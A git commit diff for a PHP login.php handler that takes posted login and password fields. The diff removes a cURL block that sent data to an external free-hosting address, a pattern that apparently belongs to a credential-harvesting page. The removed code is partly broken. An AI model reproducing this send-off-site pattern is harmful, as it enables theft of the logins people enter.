c51d6f36f182e6d4839dc49873a96543b566f2b9
OpenMirror <54529482+OpenMirror@users.noreply.github.com>
2023-06-04 16:14:39 +0200

    Update login.php

--- login.php
+++ login.php
@@ -4,16 +4,7 @@
     $login = htmlspecialchars($_POST['login']);
     $password  = htmlspecialchars($_POST['password']);
 
-    $url = "https://sparkling1234.000webhostapp.com/";
-
-    $ch = curl_init($url);
-
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
-    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-
-    $response = curl_exec($ch);
-    curl_close($ch);
+    
 
     header('Location: '.$url);
 ?>
